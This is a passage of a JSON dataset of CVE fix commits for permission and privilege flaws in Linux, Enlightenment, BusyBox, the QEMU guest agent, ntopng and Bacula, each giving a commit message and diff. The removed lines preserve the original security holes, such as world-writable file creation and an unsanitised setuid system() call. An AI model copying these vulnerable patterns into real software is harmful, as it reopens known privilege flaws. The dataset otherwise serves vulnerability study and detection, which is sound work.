writes, but also various kernel\n+ * interfaces that can write to file descriptors.\n+ *\n+ * This function provides protection for the legacy API by restricting the\n+ * calling context.\n+ *\/\n+static inline bool ib_safe_file_access(struct file *filp)\n+{\n+\treturn filp->f_cred == current_cred() && segment_eq(get_fs(), USER_DS);\n+}\n+\n #endif \/* _RDMA_IB_H *\/\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-2495","CWE_ID":"264","category":"security","commit_id":"1d1221f375c94ef961ba8574ac4f85c8870ddd51","commit_message":"From 1d1221f375c94ef961ba8574ac4f85c8870ddd51 Mon Sep 17 00:00:00 2001\nFrom: Vasiliy Kulikov <segoon@openwall.com>\nDate: Fri, 24 Jun 2011 16:08:38 +0400\nSubject: proc: restrict access to \/proc\/PID\/io\n\n\/proc\/PID\/io may be used for gathering private information.  E.g.  for\nopenssh and vsftpd daemons wchars\/rchars may be used to learn the\nprecise password length.  Restrict it to processes being able to ptrace\nthe target process.\n\nptrace_may_access() is needed to prevent keeping open file descriptor of\n\"io\" file, executing setuid binary and gathering io information of the\nsetuid'ed process.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs\/proc\/base.c | 7 +++++--\n 1 file changed, 5 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/fs\/proc\/base.c b\/fs\/proc\/base.c\nindex 8a84210ca080..fc5bc2767692 100644\n--- a\/fs\/proc\/base.c\n+++ b\/fs\/proc\/base.c\n@@ -2708,6 +2708,9 @@ static int do_io_accounting(struct task_struct *task, char *buffer, int whole)\n \tstruct task_io_accounting acct = task->ioac;\n \tunsigned long flags;\n \n+\tif (!ptrace_may_access(task, PTRACE_MODE_READ))\n+\t\treturn -EACCES;\n+\n \tif (whole && lock_task_sighand(task, &flags)) {\n \t\tstruct task_struct *t = task;\n \n@@ -2839,7 +2842,7 @@ static const struct pid_entry tgid_base_stuff[] = {\n \tREG(\"coredump_filter\", S_IRUGO|S_IWUSR, proc_coredump_filter_operations),\n #endif\n #ifdef CONFIG_TASK_IO_ACCOUNTING\n-\tINF(\"io\",\tS_IRUGO, proc_tgid_io_accounting),\n+\tINF(\"io\",\tS_IRUSR, proc_tgid_io_accounting),\n #endif\n #ifdef CONFIG_HARDWALL\n \tINF(\"hardwall\",   S_IRUGO, proc_pid_hardwall),\n@@ -3181,7 +3184,7 @@ static const struct pid_entry tid_base_stuff[] = {\n \tREG(\"make-it-fail\", S_IRUGO|S_IWUSR, proc_fault_inject_operations),\n #endif\n #ifdef CONFIG_TASK_IO_ACCOUNTING\n-\tINF(\"io\",\tS_IRUGO, proc_tid_io_accounting),\n+\tINF(\"io\",\tS_IRUSR, proc_tid_io_accounting),\n #endif\n #ifdef CONFIG_HARDWALL\n \tINF(\"hardwall\",   S_IRUGO, proc_pid_hardwall),\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-3122","CWE_ID":"264","category":"security","commit_id":"57e68e9cd65b4b8eb4045a1e0d0746458502554c","commit_message":"From 57e68e9cd65b4b8eb4045a1e0d0746458502554c Mon Sep 17 00:00:00 2001\nFrom: Vlastimil Babka <vbabka@suse.cz>\nDate: Mon, 7 Apr 2014 15:37:50 -0700\nSubject: [PATCH] mm: try_to_unmap_cluster() should lock_page() before mlocking\n\nA BUG_ON(!PageLocked) was triggered in mlock_vma_page() by Sasha Levin\nfuzzing with trinity.  The call site try_to_unmap_cluster() does not lock\nthe pages other than its check_page parameter (which is already locked).\n\nThe BUG_ON in mlock_vma_page() is not documented and its purpose is\nsomewhat unclear, but apparently it serializes against page migration,\nwhich could otherwise fail to transfer the PG_mlocked flag.  This would\nnot be fatal, as the page would be eventually encountered again, but\nNR_MLOCK accounting would become distorted nevertheless.  This patch adds\na comment to the BUG_ON in mlock_vma_page() and munlock_vma_page() to that\neffect.\n\nThe call site try_to_unmap_cluster() is fixed so that for page !=\ncheck_page, trylock_page() is attempted (to avoid possible deadlocks as we\nalready have check_page locked) and mlock_vma_page() is performed only\nupon success.  If the page lock cannot be obtained, the page is left\nwithout PG_mlocked, which is again not a problem in the whole unevictable\nmemory design.\n\nSigned-off-by: Vlastimil Babka <vbabka@suse.cz>\nSigned-off-by: Bob Liu <bob.liu@oracle.com>\nReported-by: Sasha Levin <sasha.levin@oracle.com>\nCc: Wanpeng Li <liwanp@linux.vnet.ibm.com>\nCc: Michel Lespinasse <walken@google.com>\nCc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>\nAcked-by: Rik van Riel <riel@redhat.com>\nCc: David Rientjes <rientjes@google.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Hugh Dickins <hughd@google.com>\nCc: Joonsoo Kim <iamjoonsoo.kim@lge.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n mm\/mlock.c |  2 ++\n mm\/rmap.c  | 14 ++++++++++++--\n 2 files changed, 14 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/mm\/mlock.c b\/mm\/mlock.c\nindex 4e1a681622856..b1eb536340056 100644\n--- a\/mm\/mlock.c\n+++ b\/mm\/mlock.c\n@@ -79,6 +79,7 @@ void clear_page_mlock(struct page *page)\n  *\/\n void mlock_vma_page(struct page *page)\n {\n+\t\/* Serialize with page migration *\/\n \tBUG_ON(!PageLocked(page));\n \n \tif (!TestSetPageMlocked(page)) {\n@@ -174,6 +175,7 @@ unsigned int munlock_vma_page(struct page *page)\n \tunsigned int nr_pages;\n \tstruct zone *zone = page_zone(page);\n \n+\t\/* For try_to_munlock() and to serialize with page migration *\/\n \tBUG_ON(!PageLocked(page));\n \n \t\/*\ndiff --git a\/mm\/rmap.c b\/mm\/rmap.c\nindex 11cf322f8133d..9c3e77396d1a1 100644\n--- a\/mm\/rmap.c\n+++ b\/mm\/rmap.c\n@@ -1332,9 +1332,19 @@ static int try_to_unmap_cluster(unsigned long cursor, unsigned int *mapcount,\n \t\tBUG_ON(!page || PageAnon(page));\n \n \t\tif (locked_vma) {\n-\t\t\tmlock_vma_page(page);   \/* no-op if already mlocked *\/\n-\t\t\tif (page == check_page)\n+\t\t\tif (page == check_page) {\n+\t\t\t\t\/* we know we have check_page locked *\/\n+\t\t\t\tmlock_vma_page(page);\n \t\t\t\tret = SWAP_MLOCK;\n+\t\t\t} else if (trylock_page(page)) {\n+\t\t\t\t\/*\n+\t\t\t\t * If we can lock the page, perform mlock.\n+\t\t\t\t * Otherwise leave the page alone, it will be\n+\t\t\t\t * eventually encountered again later.\n+\t\t\t\t *\/\n+\t\t\t\tmlock_vma_page(page);\n+\t\t\t\tunlock_page(page);\n+\t\t\t}\n \t\t\tcontinue;\t\/* don't unmap *\/\n \t\t}\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-1846","CWE_ID":"264","category":"security","commit_id":"bb4a21e98656fe2c7d98ba2163e6defe9a630e2b","commit_message":"From bb4a21e98656fe2c7d98ba2163e6defe9a630e2b Mon Sep 17 00:00:00 2001\nFrom: \"Carsten Haitzler (Rasterman)\" <raster@rasterman.com>\nDate: Sat, 30 Nov 2013 22:26:30 +0900\nSubject: e_sys - address security concerns with environment and gdb\n\n1. clear out environment as best is possible before executing\nanything. especially PATH and IFS are set to minimal base defaults.\nalso use clearenv() if available and unsetenv()\n\n2. remove gdb method as it's just too dangerous. run it as normal as\nthe user and if the kernel \/ distro dny that - then sorry. too bad.\n---\n configure.ac                |  2 ++\n data\/etc\/sysactions.conf.in | 15 ++++++-----\n src\/bin\/e_start_main.c      |  3 +--\n src\/bin\/e_sys_main.c        | 61 ++++++++++++++++++---------------------------\n 4 files changed, 34 insertions(+), 47 deletions(-)\n\n","diff_code":"diff --git a\/configure.ac b\/configure.ac\nindex 859090e10..420fcc099 100644\n--- a\/configure.ac\n+++ b\/configure.ac\n@@ -73,6 +73,8 @@ EFL_CHECK_PATH_MAX\n \n AC_CHECK_FUNCS(setenv)\n AC_CHECK_FUNCS(unsetenv)\n+AC_CHECK_FUNCS(clearenv)\n+AC_CHECK_HEADERS([features.h])\n \n efl_version=\"1.8.0\"\n AC_SUBST(efl_version)\ndiff --git a\/data\/etc\/sysactions.conf.in b\/data\/etc\/sysactions.conf.in\nindex eccb4af56..19520ff2c 100644\n--- a\/data\/etc\/sysactions.conf.in\n+++ b\/data\/etc\/sysactions.conf.in\n@@ -43,15 +43,14 @@\n # user and group name can use glob matches (* == all for example) like the\n # shell. as can action names allowed or denied. \n \n-action:   halt      @HALT@\n-action:   reboot    @REBOOT@\n-action:   suspend   @SUSPEND@\n-action:   hibernate @HIBERNATE@\n-action:   \/bin\/mount \/bin\/mount\n-action:   \/bin\/umount \/bin\/umount\n+action:   halt           @HALT@\n+action:   reboot         @REBOOT@\n+action:   suspend        @SUSPEND@\n+action:   hibernate      @HIBERNATE@\n+action:   \/bin\/mount     \/bin\/mount\n+action:   \/bin\/umount    \/bin\/umount\n action:   \/usr\/bin\/eject \/usr\/bin\/eject\n-action:   gdb       gdb\n-action:   l2ping    l2ping\n+action:   l2ping         \/usr\/bin\/l2ping\n \n # on FreeBSD use this instead of the above.\n #action suspend  \/usr\/sbin\/zzz \ndiff --git a\/src\/bin\/e_start_main.c b\/src\/bin\/e_start_main.c\nindex 26291556a..64aa5d4c7 100644\n--- a\/src\/bin\/e_start_main.c\n+++ b\/src\/bin\/e_start_main.c\n@@ -567,8 +567,7 @@ main(int argc, char **argv)\n                               {\n                                  \/* call e_sys gdb *\/\n                                  snprintf(buffer, 4096,\n-                                          \"%s\/enlightenment\/utils\/enlightenment_sys gdb %i %s\/.e-crashdump.txt\",\n-                                          eina_prefix_lib_get(pfx),\n+                                          \"gdb %i %s\/.e-crashdump.txt\",\n                                           child,\n                                           home);\n                                  r = system(buffer);\ndiff --git a\/src\/bin\/e_sys_main.c b\/src\/bin\/e_sys_main.c\nindex baf018bf8..e833dac8e 100644\n--- a\/src\/bin\/e_sys_main.c\n+++ b\/src\/bin\/e_sys_main.c\n@@ -1,5 +1,11 @@\n #include \"config.h\"\n \n+#define __USE_MISC\n+#define _SVID_SOURCE\n+#ifdef HAVE_FEATURES_H\n+# include <features.h>\n+#endif\n+\n #include <stdio.h>\n #include <stdlib.h>\n #include <unistd.h>\n@@ -53,7 +59,6 @@ main(int argc,\n    const char *act;\n #endif\n    gid_t gid, gl[65536], egid;\n-   int pid = 0;\n \n    for (i = 1; i < argc; i++)\n      {\n@@ -75,21 +80,6 @@ main(int argc,\n              test = 1;\n              action = argv[2];\n           }\n-        else if (!strcmp(argv[1], \"gdb\"))\n-          {\n-             if (argc != 4) exit(1);\n-             char *end = NULL;\n-\n-             action = argv[1];\n-             pid = strtoul(argv[2], &end, 10);\n-             if (end == NULL || *end != '\\0')\n-               {\n-                  printf(\"Invalid pid for '%s'.\\n\", argv[3]);\n-                  exit(0);\n-               }\n-\n-             output = argv[3];\n-          }\n \telse if (!strcmp(argv[1], \"l2ping\"))\n \t  {\n \t     action = argv[1];\n@@ -161,27 +151,7 @@ main(int argc,\n         exit(20);\n      }\n \n-   if (!strcmp(action, \"gdb\"))\n-     {\n-        char buffer[4096];\n-        int r;\n-\n-        snprintf(buffer, 4096,\n-                 \"%s --pid=%i \"\n-                 \"-batch \"\n-                 \"-ex 'set logging file %s' \"\n-                 \"-ex 'set logging on' \"\n-                 \"-ex 'thread apply all backtrace full' \"\n-                 \"-ex detach > \/dev\/null 2>&1 < \/dev\/zero\",\n-                 cmd,\n-                 pid,\n-                 output ?: \"e-output.txt\");\n-\n-        r = system(buffer);\n-\n-        exit(WEXITSTATUS(r));\n-     }\n-   else if (!test && !strcmp(action, \"l2ping\"))\n+   if (!test && !strcmp(action, \"l2ping\"))\n      {\n         char tmp[128];\n \tdouble latency;\n@@ -193,6 +163,23 @@ main(int argc,\n \n \treturn (latency < 0) ? 1 : 0;\n      }\n+   \/* sanitize environment *\/\n+#ifdef HAVE_UNSETENV\n+# define NOENV(x) unsetenv(x)\n+#else\n+# define NOENV(x)\n+#endif\n+   NOENV(\"IFS\");\n+   NOENV(\"LD_PRELOAD\");\n+   NOENV(\"PYTHONPATH\");\n+   NOENV(\"LD_LIBRARY_PATH\");\n+#ifdef HAVE_CLEARENV\n+     clearenv();\n+#endif\n+   \/* set path and ifs to minimal defaults *\/\n+   putenv(\"PATH=\/bin:\/usr\/bin\");\n+   putenv(\"IFS= \\t\\n\");\n+\n    if ((!test)\n #ifdef HAVE_EEZE_MOUNT\n        && (!mnt)\n-- \ncgit v1.2.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-1813","CWE_ID":"264","category":"security","commit_id":"4609f477c7e043a4f6147dfe6e86b775da2ef784","commit_message":"From 4609f477c7e043a4f6147dfe6e86b775da2ef784 Mon Sep 17 00:00:00 2001\nFrom: Denys Vlasenko <vda.linux@googlemail.com>\nDate: Mon, 21 Jan 2013 01:22:12 +0100\nSubject: mdev: fix mode of dir1 in =dir1\/dir2\/file rule\n\nSigned-off-by: Denys Vlasenko <vda.linux@googlemail.com>\n---\n testsuite\/mdev.tests | 22 +++++++++++++++++++++-\n util-linux\/mdev.c    | 16 ++++++++++++++--\n 2 files changed, 35 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/testsuite\/mdev.tests b\/testsuite\/mdev.tests\nindex 7320e17dd..48d3dcc2c 100755\n--- a\/testsuite\/mdev.tests\n+++ b\/testsuite\/mdev.tests\n@@ -11,7 +11,7 @@ FILTER_LS=\"grep -v '^total ' | sed -e 's\/,  *\/,\/g' -e 's\/  *\/ \/g' | cut -d' ' -f\n # cut: remove size+date\n FILTER_LS2=\"grep -v '^total ' | sed -e 's\/,  *\/,\/g' -e 's\/  *\/ \/g' | cut -d' ' -f 1-4,9-\"\n \n-# testing \"test name\" \"options\" \"expected result\" \"file input\" \"stdin\"\n+# testing \"test name\" \"commands\" \"expected result\" \"file input\" \"stdin\"\n \n rm -rf mdev.testdir\n mkdir mdev.testdir\n@@ -126,6 +126,26 @@ br--r--r-- 1 0 0 sda\n \t\"\" \"\"\n SKIP=\n \n+# continuing to use directory structure from prev test\n+rm -rf mdev.testdir\/dev\/*\n+echo \"sda 0:0 444 =disk\/sd\/a\" >mdev.testdir\/etc\/mdev.conf\n+optional STATIC FEATURE_MDEV_CONF FEATURE_MDEV_RENAME FEATURE_LS_RECURSIVE FEATURE_LS_TIMESTAMPS FEATURE_LS_USERNAME\n+testing \"mdev move rule '=bar\/baz\/fname'\" \\\n+\t\"env - PATH=$PATH ACTION=add DEVPATH=\/block\/sda chroot mdev.testdir \/mdev 2>&1;\n+\tls -lnR mdev.testdir\/dev | $FILTER_LS2\" \\\n+\"\\\n+mdev.testdir\/dev:\n+drwxr-xr-x 3 0 0 disk\n+\n+mdev.testdir\/dev\/disk:\n+drwxr-xr-x 2 0 0 sd\n+\n+mdev.testdir\/dev\/disk\/sd:\n+br--r--r-- 1 0 0 a\n+\" \\\n+\t\"\" \"\"\n+SKIP=\n+\n # continuing to use directory structure from prev test\n rm -rf mdev.testdir\/dev\/*\n # here we complicate things by having non-matching group 1 and using %0\ndiff --git a\/util-linux\/mdev.c b\/util-linux\/mdev.c\nindex 79871d30e..75de14ff1 100644\n--- a\/util-linux\/mdev.c\n+++ b\/util-linux\/mdev.c\n@@ -429,6 +429,18 @@ static const struct rule *next_rule(void)\n \n #endif\n \n+static void mkdir_recursive(char *name)\n+{\n+\t\/* if name has many levels (\"dir1\/dir2\"),\n+\t * bb_make_directory() will create dir1 according to umask,\n+\t * not according to its \"mode\" parameter.\n+\t * Since we run with umask=0, need to temporarily switch it.\n+\t *\/\n+\tumask(022); \/* \"dir1\" (if any) will be 0755 too *\/\n+\tbb_make_directory(name, 0755, FILEUTILS_RECUR);\n+\tumask(0);\n+}\n+\n \/* Builds an alias path.\n  * This function potentionally reallocates the alias parameter.\n  * Only used for ENABLE_FEATURE_MDEV_RENAME\n@@ -442,7 +454,7 @@ static char *build_alias(char *alias, const char *device_name)\n \tdest = strrchr(alias, '\/');\n \tif (dest) { \/* \">bar\/[baz]\" ? *\/\n \t\t*dest = '\\0'; \/* mkdir bar *\/\n-\t\tbb_make_directory(alias, 0755, FILEUTILS_RECUR);\n+\t\tmkdir_recursive(alias);\n \t\t*dest = '\/';\n \t\tif (dest[1] == '\\0') { \/* \">bar\/\" => \">bar\/device_name\" *\/\n \t\t\tdest = alias;\n@@ -641,7 +653,7 @@ static void make_device(char *device_name, char *path, int operation)\n \t\t\tchar *slash = strrchr(node_name, '\/');\n \t\t\tif (slash) {\n \t\t\t\t*slash = '\\0';\n-\t\t\t\tbb_make_directory(node_name, 0755, FILEUTILS_RECUR);\n+\t\t\t\tmkdir_recursive(node_name);\n \t\t\t\t*slash = '\/';\n \t\t\t}\n \t\t\tif (G.verbose)\n-- \ncgit v1.2.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2013-2007","CWE_ID":"264","category":"security","commit_id":"c689b4f1bac352dcfd6ecb9a1d45337de0f1de67","commit_message":"From c689b4f1bac352dcfd6ecb9a1d45337de0f1de67 Mon Sep 17 00:00:00 2001\nFrom: Laszlo Ersek <lersek@redhat.com>\nDate: Wed, 24 Apr 2013 13:13:18 +0200\nSubject: [PATCH] qga: set umask 0077 when daemonizing (CVE-2013-2007)\n\nThe qemu guest agent creates a bunch of files with insecure permissions\nwhen started in daemon mode. For example:\n\n  -rw-rw-rw- 1 root root \/var\/log\/qemu-ga.log\n  -rw-rw-rw- 1 root root \/var\/run\/qga.state\n  -rw-rw-rw- 1 root root \/var\/log\/qga-fsfreeze-hook.log\n\nIn addition, at least all files created with the \"guest-file-open\" QMP\ncommand, and all files created with shell output redirection (or\notherwise) by utilities invoked by the fsfreeze hook script are affected.\n\nFor now mask all file mode bits for \"group\" and \"others\" in\nbecome_daemon().\n\nTemporarily, for compatibility reasons, stick with the 0666 file-mode in\ncase of files newly created by the \"guest-file-open\" QMP call. Do so\nwithout changing the umask temporarily.\n\nSigned-off-by: Laszlo Ersek <lersek@redhat.com>\nSigned-off-by: Anthony Liguori <aliguori@us.ibm.com>\n---\n qga\/commands-posix.c | 123 +++++++++++++++++++++++++++++++++++++++++++++++++--\n qga\/main.c           |   2 +-\n 2 files changed, 120 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/qga\/commands-posix.c b\/qga\/commands-posix.c\nindex 3b5c536..04c6951 100644\n--- a\/qga\/commands-posix.c\n+++ b\/qga\/commands-posix.c\n@@ -18,6 +18,9 @@\n #include <unistd.h>\n #include <errno.h>\n #include <fcntl.h>\n+#include <stdio.h>\n+#include <string.h>\n+#include <sys\/stat.h>\n #include <inttypes.h>\n #include \"qga\/guest-agent-core.h\"\n #include \"qga-qmp-commands.h\"\n@@ -237,9 +240,122 @@ static GuestFileHandle *guest_file_handle_find(int64_t id, Error **err)\n     return NULL;\n }\n \n+typedef const char * const ccpc;\n+\n+\/* http:\/\/pubs.opengroup.org\/onlinepubs\/9699919799\/functions\/fopen.html *\/\n+static const struct {\n+    ccpc *forms;\n+    int oflag_base;\n+} guest_file_open_modes[] = {\n+    { (ccpc[]){ \"r\",  \"rb\",         NULL }, O_RDONLY                      },\n+    { (ccpc[]){ \"w\",  \"wb\",         NULL }, O_WRONLY | O_CREAT | O_TRUNC  },\n+    { (ccpc[]){ \"a\",  \"ab\",         NULL }, O_WRONLY | O_CREAT | O_APPEND },\n+    { (ccpc[]){ \"r+\", \"rb+\", \"r+b\", NULL }, O_RDWR                        },\n+    { (ccpc[]){ \"w+\", \"wb+\", \"w+b\", NULL }, O_RDWR   | O_CREAT | O_TRUNC  },\n+    { (ccpc[]){ \"a+\", \"ab+\", \"a+b\", NULL }, O_RDWR   | O_CREAT | O_APPEND }\n+};\n+\n+static int\n+find_open_flag(const char *mode_str, Error **err)\n+{\n+    unsigned mode;\n+\n+    for (mode = 0; mode < ARRAY_SIZE(guest_file_open_modes); ++mode) {\n+        ccpc *form;\n+\n+        form = guest_file_open_modes[mode].forms;\n+        while (*form != NULL && strcmp(*form, mode_str) != 0) {\n+            ++form;\n+        }\n+        if (*form != NULL) {\n+            break;\n+        }\n+    }\n+\n+    if (mode == ARRAY_SIZE(guest_file_open_modes)) {\n+        error_setg(err, \"invalid file open mode '%s'\", mode_str);\n+        return -1;\n+    }\n+    return guest_file_open_modes[mode].oflag_base | O_NOCTTY | O_NONBLOCK;\n+}\n+\n+#define DEFAULT_NEW_FILE_MODE (S_IRUSR | S_IWUSR | \\\n+                               S_IRGRP | S_IWGRP | \\\n+                               S_IROTH | S_IWOTH)\n+\n+static FILE *\n+safe_open_or_create(const char *path, const char *mode, Error **err)\n+{\n+    Error *local_err = NULL;\n+    int oflag;\n+\n+    oflag = find_open_flag(mode, &local_err);\n+    if (local_err == NULL) {\n+        int fd;\n+\n+        \/* If the caller wants \/ allows creation of a new file, we implement it\n+         * with a two step process: open() + (open() \/ fchmod()).\n+         *\n+         * First we insist on creating the file exclusively as a new file. If\n+         * that succeeds, we're free to set any file-mode bits on it. (The\n+         * motivation is that we want to set those file-mode bits independently\n+         * of the current umask.)\n+         *\n+         * If the exclusive creation fails because the file already exists\n+         * (EEXIST is not possible for any other reason), we just attempt to\n+         * open the file, but in this case we won't be allowed to change the\n+         * file-mode bits on the preexistent file.\n+         *\n+         * The pathname should never disappear between the two open()s in\n+         * practice. If it happens, then someone very likely tried to race us.\n+         * In this case just go ahead and report the ENOENT from the second\n+         * open() to the caller.\n+         *\n+         * If the caller wants to open a preexistent file, then the first\n+         * open() is decisive and its third argument is ignored, and the second\n+         * open() and the fchmod() are never called.\n+         *\/\n+        fd = open(path, oflag | ((oflag & O_CREAT) ? O_EXCL : 0), 0);\n+        if (fd == -1 && errno == EEXIST) {\n+            oflag &= ~(unsigned)O_CREAT;\n+            fd = open(path, oflag);\n+        }\n+\n+        if (fd == -1) {\n+            error_setg_errno(&local_err, errno, \"failed to open file '%s' \"\n+                             \"(mode: '%s')\", path, mode);\n+        } else {\n+            qemu_set_cloexec(fd);\n+\n+            if ((oflag & O_CREAT) && fchmod(fd, DEFAULT_NEW_FILE_MODE) == -1) {\n+                error_setg_errno(&local_err, errno, \"failed to set permission \"\n+                                 \"0%03o on new file '%s' (mode: '%s')\",\n+                                 (unsigned)DEFAULT_NEW_FILE_MODE, path, mode);\n+            } else {\n+                FILE *f;\n+\n+                f = fdopen(fd, mode);\n+                if (f == NULL) {\n+                    error_setg_errno(&local_err, errno, \"failed to associate \"\n+                                     \"stdio stream with file descriptor %d, \"\n+                                     \"file '%s' (mode: '%s')\", fd, path, mode);\n+                } else {\n+                    return f;\n+                }\n+            }\n+\n+            close(fd);\n+        }\n+    }\n+\n+    error_propagate(err, local_err);\n+    return NULL;\n+}\n+\n int64_t qmp_guest_file_open(const char *path, bool has_mode, const char *mode, Error **err)\n {\n     FILE *fh;\n+    Error *local_err = NULL;\n     int fd;\n     int64_t ret = -1, handle;\n \n@@ -247,10 +363,9 @@ int64_t qmp_guest_file_open(const char *path, bool has_mode, const char *mode, E\n         mode = \"r\";\n     }\n     slog(\"guest-file-open called, filepath: %s, mode: %s\", path, mode);\n-    fh = fopen(path, mode);\n-    if (!fh) {\n-        error_setg_errno(err, errno, \"failed to open file '%s' (mode: '%s')\",\n-                         path, mode);\n+    fh = safe_open_or_create(path, mode, &local_err);\n+    if (local_err != NULL) {\n+        error_propagate(err, local_err);\n         return -1;\n     }\n \ndiff --git a\/qga\/main.c b\/qga\/main.c\nindex 1841759..44a2836 100644\n--- a\/qga\/main.c\n+++ b\/qga\/main.c\n@@ -478,7 +478,7 @@ static void become_daemon(const char *pidfile)\n         }\n     }\n \n-    umask(0);\n+    umask(S_IRWXG | S_IRWXO);\n     sid = setsid();\n     if (sid < 0) {\n         goto fail;\n-- \n1.8.3.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2018-12520","CWE_ID":"264","category":"security","commit_id":"30610bda60cbfc058f90a1c0a17d0e8f4516221a","commit_message":"From 30610bda60cbfc058f90a1c0a17d0e8f4516221a Mon Sep 17 00:00:00 2001\nFrom: Luca Deri <deri@ntop.org>\nDate: Sun, 17 Jun 2018 15:24:25 +0200\nSubject: [PATCH] Added code to randomize values returned by rand()\n\n---\n src\/HTTPserver.cpp | 5 +++++\n 1 file changed, 5 insertions(+)\n\n","diff_code":"diff --git a\/src\/HTTPserver.cpp b\/src\/HTTPserver.cpp\nindex f954a4b94..68cffcfb5 100644\n--- a\/src\/HTTPserver.cpp\n+++ b\/src\/HTTPserver.cpp\n@@ -864,7 +864,12 @@ HTTPserver::HTTPserver(const char *_docs_dir, const char *_scripts_dir) {\n   bool use_http = true;\n   struct stat statsBuf;\n   int stat_rc;\n+  struct timeval tv;\n \n+  \/* Randomize data *\/\n+  gettimeofday(&tv, NULL);\n+  srand(tv.tv_sec + tv.tv_usec);\n+  \n   static char *http_options[] = {\n     (char*)\"listening_ports\", ports,\n     (char*)\"enable_directory_listing\", (char*)\"no\",\n","owner":"ntop","repo":"ntopng","source":"cve"},{"CVE_ID":"CVE-2012-0028","CWE_ID":"264","category":"security","commit_id":"8141c7f3e7aee618312fa1c15109e1219de784a7","commit_message":"From 8141c7f3e7aee618312fa1c15109e1219de784a7 Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Sat, 15 Nov 2008 10:20:36 -0800\nSubject: Move \"exit_robust_list\" into mm_release()\n\nWe don't want to get rid of the futexes just at exit() time, we want to\ndrop them when doing an execve() too, since that gets rid of the\nprevious VM image too.\n\nDoing it at mm_release() time means that we automatically always do it\nwhen we disassociate a VM map from the task.\n\nReported-by: pageexec@freemail.hu\nCc: Andrew Morton <akpm@linux-foundation.org>\nCc: Nick Piggin <npiggin@suse.de>\nCc: Hugh Dickins <hugh@veritas.com>\nCc: Ingo Molnar <mingo@elte.hu>\nCc: Thomas Gleixner <tglx@linutronix.de>\nCc: Brad Spengler <spender@grsecurity.net>\nCc: Alex Efros <powerman@powerman.name>\nCc: Peter Zijlstra <a.p.zijlstra@chello.nl>\nCc: Oleg Nesterov <oleg@redhat.com>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n kernel\/exit.c |  9 ---------\n kernel\/fork.c | 11 +++++++++++\n 2 files changed, 11 insertions(+), 9 deletions(-)\n\n","diff_code":"diff --git a\/kernel\/exit.c b\/kernel\/exit.c\nindex ae2b92be5fae..2d8be7ebb0f7 100644\n--- a\/kernel\/exit.c\n+++ b\/kernel\/exit.c\n@@ -40,7 +40,6 @@\n #include <linux\/cn_proc.h>\n #include <linux\/mutex.h>\n #include <linux\/futex.h>\n-#include <linux\/compat.h>\n #include <linux\/pipe_fs_i.h>\n #include <linux\/audit.h> \/* for audit_free() *\/\n #include <linux\/resource.h>\n@@ -1059,14 +1058,6 @@ NORET_TYPE void do_exit(long code)\n \t\texit_itimers(tsk->signal);\n \t}\n \tacct_collect(code, group_dead);\n-#ifdef CONFIG_FUTEX\n-\tif (unlikely(tsk->robust_list))\n-\t\texit_robust_list(tsk);\n-#ifdef CONFIG_COMPAT\n-\tif (unlikely(tsk->compat_robust_list))\n-\t\tcompat_exit_robust_list(tsk);\n-#endif\n-#endif\n \tif (group_dead)\n \t\ttty_audit_exit();\n \tif (unlikely(tsk->audit_context))\ndiff --git a\/kernel\/fork.c b\/kernel\/fork.c\nindex f6083561dfe0..2a372a0e206f 100644\n--- a\/kernel\/fork.c\n+++ b\/kernel\/fork.c\n@@ -40,6 +40,7 @@\n #include <linux\/jiffies.h>\n #include <linux\/tracehook.h>\n #include <linux\/futex.h>\n+#include <linux\/compat.h>\n #include <linux\/task_io_accounting_ops.h>\n #include <linux\/rcupdate.h>\n #include <linux\/ptrace.h>\n@@ -519,6 +520,16 @@ void mm_release(struct task_struct *tsk, struct mm_struct *mm)\n {\n \tstruct completion *vfork_done = tsk->vfork_done;\n \n+\t\/* Get rid of any futexes when releasing the mm *\/\n+#ifdef CONFIG_FUTEX\n+\tif (unlikely(tsk->robust_list))\n+\t\texit_robust_list(tsk);\n+#ifdef CONFIG_COMPAT\n+\tif (unlikely(tsk->compat_robust_list))\n+\t\tcompat_exit_robust_list(tsk);\n+#endif\n+#endif\n+\n \t\/* Get rid of any cached register state *\/\n \tdeactivate_mm(tsk, mm);\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2012-4430","CWE_ID":"264","category":"security","commit_id":"67debcecd3d530c429e817e1d778e79dcd1db905","commit_message":"From 67debcecd3d530c429e817e1d778e79dcd1db905 Mon Sep 17 00:00:00 2001\nFrom: Kern Sibbald <kern@sibbald.com>\nDate: Sat, 18 Aug 2012 15:46:03 +0200\nSubject: Make dump_resource respect console ACL's\n\n---\n bacula\/src\/dird\/dird_conf.c | 22 ++++++++++++++++++++++\n 1 file changed, 22 insertions(+)\n\n","diff_code":"diff --git a\/bacula\/src\/dird\/dird_conf.c b\/bacula\/src\/dird\/dird_conf.c\nindex 7dcf591..2f2eb00 100644\n--- a\/bacula\/src\/dird\/dird_conf.c\n+++ b\/bacula\/src\/dird\/dird_conf.c\n@@ -554,6 +554,7 @@ void dump_resource(int type, RES *reshdr, void sendit(void *sock, const char *fm\n    bool recurse = true;\n    char ed1[100], ed2[100], ed3[100];\n    DEVICE *dev;\n+   UAContext *ua = (UAContext *)sock;\n \n    if (res == NULL) {\n       